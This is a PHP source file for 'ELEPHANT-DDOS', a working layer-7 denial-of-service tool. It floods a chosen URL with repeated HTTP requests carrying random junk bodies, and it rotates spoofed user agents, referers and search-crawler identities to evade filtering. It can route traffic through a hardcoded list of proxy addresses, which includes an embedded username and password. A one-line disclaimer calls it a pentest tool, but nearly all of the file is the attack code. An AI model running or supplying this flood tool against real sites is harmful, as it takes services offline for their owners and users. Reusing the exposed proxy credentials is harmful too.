<?php

/* REALZCODE - ELEPHANT-DDOS A V1.1
 * “Surely Allah is my Lord and your Lord, so worship Him ˹alone˺. This is the Straight Path.” QS.Maryam:36
 * Disclaimer of Distributed Denial of Service (DDOS) Layer 7 Pentester Tool are design for Cyber Security Professional
 */

set_time_limit(0);

echo "REALZCODE - ELEPHANT-DDOS A V1.1\n";

$target  = readline('URL     [http://attack.com]: ') ?: 'http://localhost';
$type    = intval(readline('TYPE    [0:fopen,1:curl,2:file_get_contents]: ') ?: 0);
$method  = intval(readline('METHOD  [0:GET,1:HEAD,2:POST,3:PUT,9:RAND]: ') ?: 0);
$param   = readline('PARAM   [ ,data=,q=]: ') ?: '';
$utf     = intval(readline('UNICODE [0:UTF-8,1:UTF-16,2:UTF-32]: ') ?: 0);
$ctype   = intval(readline('CONTENT [0:text/html,1:application/x,2:multipart/form,7:RAND]: ') ?: 0);
$count   = intval(readline('COUNT   [10]: ') ?: 10);
$reqs    = intval(readline('REQUEST [10]: ') ?: 10);
$byte    = intval(readline('BYTE    [1024]: ') ?: 1024);
$origin  = intval(readline('ORIGIN  [0: ,1:*,2:HOST]: ') ?: 0);
$follow  = intval(readline('FOLLOW  [0:NO,1:YES]: ') ?: 0);
$ignerr  = intval(readline('IGNERR  [0:NO,1:YES]: ') ?: 0);
$maxdir  = intval(readline('MAXDIR  [0]: ') ?: 0);
$timeout = intval(readline('TIMEOUT [0]: ') ?: 0);
$close   = intval(readline('CLOSEC  [0:NO,1:YES]: ') ?: 0);
$proxy   = intval(readline('PROXY   [0:NO,1:YES]: ') ?: 0);
$debug   = intval(readline('DEBUG   [0:NO,1:YES]: ') ?: 0);

error_reporting($debug==1?E_ALL:0);

echo "\nSTART DDOS ATTACK !\n\n";

$ok = 0; $oks = 0; $no = 0;
$start = (int) microtime(true);
$tstart = date('H:i:s');

$target = trim($target);
$param = trim($param);

if (strpos($target, "http://") === 0 || strpos($target, "https://") === 0) 
{
    stream_context_set_default( [
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ],
    ]);

    $check_url = get_headers($target);

    if (is_null($check_url[0]))
    {
        echo "URL NOT EXISTS\n"; exit;
    }
    else
    {
        echo "HEADER: [" . $check_url[0] . "]\n";
    }
}
else
{
    echo "URL MUST BEGIN WITH http:// OR https://"; exit;
}

for ($r = 1; $r <= $count; $r++)
{
    echo "[$r] ATTACKING => [$target]\n";

    $user_agent = array(
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe)',
        'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v',
        'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; moto g 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; moto g power (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1',
        'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
        'Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1',
        'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1',
        'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1',
        'Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1',
        'Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1',
        'Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3',
        'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254',
        'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536',
        'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058',
        'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
        'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
        'Dalvik/2.1.0 (Linux; U; Android 9; ADT-2 Build/PTT5.181126.002)',
        'Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36',
        'Roku4640X/DVP-7.70 (297.70E04154A)',
        'Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
        'Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36',
        'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)',
        'AppleTV11,1/11.1',
        'AppleTV6,2/11.1',
        'AppleTV5,3/9.1.1',
        'Mozilla/5.0 (PlayStation; PlayStation 5/2.26) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15',
        'Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)',
        'Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
        'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586',
        'Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343',
        'Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US',
        'Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
        'Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+',
        'Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Version/4.0 Kindle/3.0 (screen 600x800; rotate)'
    );

    $method__ = array(
        'GET',
        'HEAD',
        'POST',
        'PUT',
        'DELETE',
        'CONNECT',
        'OPTIONS',
        'TRACE',
        'PATCH'
    );

    $_method = array(
        'GET',
        'HEAD',
        'POST',
        'OPTIONS',
    );

    $utf_ = array(
        'UTF-8',     // 0: N/A
        'UTF-16',    // 1: <BOM> byte order mark
        'UTF-32',    // 2: big-endian
        'UTF-16BE',  // 3: little-endian
        'UTF-16LE',  // 4: <BOM> byte order mark
        'UTF-32BE',  // 5: big-endian
        'UTF-32LE',  // 6: little-endian
    );

    $utf__ = isset($utf_[$utf]) ? 
             $utf_[$utf] : 
             $utf_[array_rand($utf_)];

    $content_type = array(
        'text/html; charset=' . $utf__,
        'application/x-www-form-urlencoded',
        'multipart/form-data; boundary=' . time(),
        'text/xml; charset=' . $utf__,
        'text/plain; charset=' . $utf__,
        'application/xml; charset=' . $utf__,
        'application/json; charset=' . $utf__,
    );

    $referer = array(
        'https://www.wolframalpha.com/',
        'https://www.startpage.com/',
        'https://duckduckgo.com/',
        'https://www.google.com/',
        'https://www.ecosia.org/',
        'https://www.bing.com/',
        'https://www.baidu.com/',
        'https://search.aol.com/',
        'https://search.lycos.com/',
        'https://search.yahoo.com/'
    );

    $ddos = null;
    $ddos_length = 0;
    $method_ = isset($method__[$method]) ? $method__[$method] : $_method[array_rand($_method)];

    if ($method_ === 'POST' || $method_ === 'PUT')
    {
        for ($j = 1; $j <= $byte; $j++)
        {
            $unicode = mt_rand(0x0000, 0x10FFFF);
            $ddos.= mb_convert_encoding(mb_chr($unicode), $utf__);
            $ddos_length++;
        }
    }

    $user_agent    = $debug != 0 ? ['RealzCode-DDOS.A/1.0 (PENTEST TOOLS FOR CYBER SECURITY PROFFESIONAL)'] : $user_agent;
    $content_type_ = isset($content_type[$ctype]) ? $content_type[$ctype] : $content_type[array_rand($content_type)];
    $accept_       = $content_type[array_rand($content_type)];
    $user_agent_   = $user_agent[array_rand($user_agent)];
    $referer_      = $referer[array_rand($referer)];
    $host_         = parse_url($target);

    $origin_ = [
        "",
        "*",
        $host_['scheme'] . "://" . $host_['host']
    ];

    $origin__ = isset($origin_[$origin]) ? $origin_[$origin] : "";

    $proxy_list = [ // https://www.webshare.io
        "45.94.47.66:8110:syrzyvzz:5hnkph6g5e2o",
        "45.155.68.129:8133:syrzyvzz:5hnkph6g5e2o",
        "154.95.36.199:6893:syrzyvzz:5hnkph6g5e2o",
        "188.74.183.10:8279:syrzyvzz:5hnkph6g5e2o",
        "188.74.210.21:6100:syrzyvzz:5hnkph6g5e2o",
        "38.154.227.167:5868:syrzyvzz:5hnkph6g5e2o",
        "188.74.210.207:6286:syrzyvzz:5hnkph6g5e2o",
        "185.199.231.45:8382:syrzyvzz:5hnkph6g5e2o",
        "185.199.229.156:7492:syrzyvzz:5hnkph6g5e2o",
        "185.199.228.220:7300:syrzyvzz:5hnkph6g5e2o",
    ];

    $proxy_list_ = explode(":", $proxy_list[array_rand($proxy_list)]);

    $packets = [
        "Host: " . $host_['host'],
        "Referer: $referer_",
        "User-Agent: $user_agent_",
        "Accept: $accept_",
        "Content-Type: $content_type_",
        "Content-Length: ". $ddos_length,
        "Origin: " . $origin__,
        "Keep-Alive: " . time(),
        "Cache-Control: no-cache",
        "Connection: close"
    ];

    shuffle($packets);

    $data_ = [];

    for ($o = 0; $o < count($packets); $o++) 
    {
        $data_[] = $packets[$o];
    }

    $options = array(
        'ssl' => array(
            'verify_peer' => 'false',
            'verify_peer_name' => 'false'
        ),
        "http" => array(
            "header" => $data_,
            "method" => $method_,
            "timeout" => $timeout,
            "max_redirects" => $maxdir,
            "user_agent" => $user_agent_,
            "ignore_errors" => $ignerr == 1 ? 'true' : 'false',
            "follow_location" => $follow == 1 ? 'true' : 'false',
        )
    );

    if ($proxy)
    {
        $options['http']['header'] = ["Proxy-Authorization: Basic " . base64_encode($proxy_list_[2] . ':' . $proxy_list_[3])] + $data_ ;
        $options['http']['proxy'] = 'tcp://' . $proxy_list_[0] . ':' . $proxy_list_[1];
        $options['http']['request_fulluri'] = 'true';
    }

    if ($debug != 0) {print_r($options);}

    if ($method_ === 'POST' || $method_ === 'PUT')
    {
        $options["http"]["content"] = $param . $ddos;
    }

    $results = null;
    $context = stream_context_create($options);

    for ($c = 1; $c <= $reqs; $c++)
    {
        echo "[$c/$reqs] REQUESTING...\n";

        $space  = "[$c/$reqs]";
        $space_ = str_repeat('-', strlen($space));

        if ($type == 0)
        {
            try 
            {
                $results = fopen($target, 'r', false, $context);

                if ($debug != 0) 
                {
                    $meta = stream_get_meta_data($results);
                    print_r($meta);
                }

                // D  D    O    S
                // NO READ JUST SEND :D
                // $output = fpassthru($results);
                // fclose($results);
                // var_dump($output);
            }
            catch (Exception $e) 
            {
                echo "REQUEST [ERROR]. REASON: " . $e->getMessage();

                if ($debug != 0) {exit;} else {continue;}
            }
        }
        else if ($type == 1)
        {
            try 
            {
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_URL, $target);
                curl_setopt($curl, CURLOPT_HTTPHEADER, $data_);
                curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, true);
                curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($curl, CURLOPT_FOLLOWLOCATION, $follow == 1 ? 1 : 0);
                curl_setopt($curl, CURLOPT_FAILONERROR, $ignerr == 1 ? false : true);
                curl_setopt($curl, CURLOPT_MAXREDIRS, $maxdir);

                if ($proxy)
                {
                    curl_setopt($curl, CURLOPT_PROXY, $proxy_list_[0]);
                    curl_setopt($curl, CURLOPT_PROXYUSERPWD, $proxy_list_[2] . ':' . $proxy_list_[3]);
                    curl_setopt($curl, CURLOPT_PROXYPORT, $proxy_list_[1]);
                    curl_setopt($curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);
                }

                if ($method_ !== 'GET')
                {
                    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, $method_);
                }
                
                if ($method_ === 'POST' || $method_ === 'PUT')
                {
                    curl_setopt($curl, CURLOPT_POSTFIELDS, $param . $ddos);
                }

                $results = curl_exec($curl);

                if ($debug != 0) {print_r($results);}

                if ($close != 0) 
                {
                    curl_close($curl);
                }
            }
            catch (Exception $e) 
            {
                echo "REQUEST [ERROR]. REASON: " . $e->getMessage();

                if ($debug != 0) {exit;} else {continue;}
            }
        }
        else if ($type == 2)
        {
            try 
            {
                $results = file_get_contents($target, false, $context);
                if ($debug != 0) {print_r($results);}
            }
            catch (Exception $e) 
            {
                echo "REQUEST [ERROR]. REASON: " . $e->getMessage();

                if ($debug != 0) {exit;} else {continue;}
            }
        }

        if (!$results)
        {
            $no++;

            echo $space_ . " REQUEST [FAILED]\n";

            if ($debug != 0) {exit;} else {continue;}
        }
        else
        {
            $ok++;

            echo $space_ . " REQUEST [OK]\n";
        }
    }

    $prog = ($r/$count*100);
    $end  = (int) microtime(true);
    $time = date('H:i:s', ($end - $start - 3600));

    echo "\nPROGRESS: $prog% | TIME: $time | RECEIVED: $ok | REFUSED: $no\n\n";
}

$res_target = "URL TARGET: $target\n";
$space_ = str_repeat('-', strlen($res_target));
$tend = date('H:i:s');

echo "$space_\n";
echo $res_target;
echo "COUNT/REQUEST: $count/$reqs\n";
echo "BYTE: $byte\n";
echo "BYTE TOTAL: " . convertBytes($count * $reqs * $byte) . "\n";
echo "TIME START: $tstart\n";
echo "TIME END: $tend\n";
echo "$space_\n";
echo "[ ALL DONE ]\n";
echo "RECEIVED: $ok\n";
echo "REFUSED: $no\n";

function convertBytes($byte) {
    $kb = $byte / 1024; if ($kb < 1024) {return number_format($kb, 2, '.', ',') . " KB";}
    $mb = $kb / 1024; if ($mb < 1024) {return number_format($mb, 2, '.', ',') . " MB";}
    $gb = $mb / 1024; if ($gb < 1024) {return number_format($gb, 2, '.', ',') . " GB";}
    $tb = $gb / 1024; return number_format($tb, 2, '.', ',') . " TB";
}

?>
